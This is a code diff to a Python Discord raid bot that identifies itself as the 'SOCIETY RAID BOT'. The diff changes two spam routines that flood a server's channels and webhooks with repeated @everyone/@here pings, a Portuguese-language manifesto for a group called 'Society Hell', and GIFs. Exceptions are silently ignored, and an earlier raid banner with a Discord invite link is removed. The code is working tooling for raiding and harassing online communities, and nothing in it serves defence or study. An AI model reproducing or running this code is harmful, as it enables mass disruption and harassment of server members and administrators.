@@ -647,8 +647,25 @@ async def webhook_spam(guild, banner, art, gifs):
 
 async def spam_webhook(webhook, banner, art, gifs):
     try:
+        mensagem = (
+            "@everyone @here\n\n"
+            "Quem somos?\n"
+            "Somos um grupo que valoriza atitude, respeito e consciência. Não estamos aqui por acaso — cada pessoa tem um papel e sabe o que está fazendo.\n\n"
+            "Do bem ou do mal?\n"
+            "Nos consideramos do bem, mas não seguimos rótulos cegamente. Fazemos o que achamos certo, sem depender da opinião dos outros.\n\n"
+            "O que importa aqui?\n"
+            "Lealdade, postura e inteligência. Quem entra precisa entender isso desde o começo.\n\n"
+            "Society Team\n"
+            "Mais do que um nome, é uma base. Organização, visão e controle sobre o que fazemos.\n\n"
+            "Nossa visão\n"
+            "Criar algo sólido, sem bagunça e sem gente sem compromisso. Crescer com consistência.\n\n"
+            "Como agimos\n"
+            "Sem impulso, sem desrespeito, sem atitudes vazias. Tudo tem um motivo.\n\n"
+            "Estamos online\n"
+            "Society Hell is back"
+        )
         for i in range(100):
-            await webhook.send(f"@everyone **{banner}**\n{art}\n{gifs[i % len(gifs)]}")
+            await webhook.send(f"{mensagem}\n{gifs[i % len(gifs)]}")
     except:
         pass
 
@@ -1269,17 +1286,27 @@ async def system_msg_spam(guild):
 async def spam_messages(canal, banner, art, gifs):
     try:
         await asyncio.sleep(1)
+        mensagem = (
+            "@everyone @here\n\n"
+            "Quem somos?\n"
+            "Somos um grupo que valoriza atitude, respeito e consciência. Não estamos aqui por acaso — cada pessoa tem um papel e sabe o que está fazendo.\n\n"
+            "Do bem ou do mal?\n"
+            "Nos consideramos do bem, mas não seguimos rótulos cegamente. Fazemos o que achamos certo, sem depender da opinião dos outros.\n\n"
+            "O que importa aqui?\n"
+            "Lealdade, postura e inteligência. Quem entra precisa entender isso desde o começo.\n\n"
+            "Society Team\n"
+            "Mais do que um nome, é uma base. Organização, visão e controle sobre o que fazemos.\n\n"
+            "Nossa visão\n"
+            "Criar algo sólido, sem bagunça e sem gente sem compromisso. Crescer com consistência.\n\n"
+            "Como agimos\n"
+            "Sem impulso, sem desrespeito, sem atitudes vazias. Tudo tem um motivo.\n\n"
+            "Estamos online\n"
+            "Society Hell is back"
+        )
         for i in range(25):
             try:
-                embed = discord.Embed(
-                    title=f"⚠️ {banner} ⚠️",
-                    description=f"**{art}**\n\n**SOCIETY RAID TEAM PASSOU AQUI!**\n\nEntre: https://discord.gg/WJ76QgRA",
-                    color=0xFF0000
-                )
-                embed.set_image(url=gifs[i % len(gifs)])
-                embed.set_footer(text="SOCIETY RAID BOT V0.0.0")
-                
-                await canal.send(content="@everyone", embed=embed)
+                await canal.send(mensagem)
+                await canal.send(gifs[i % len(gifs)])
                 await asyncio.sleep(0.4)
             except:
                 continue
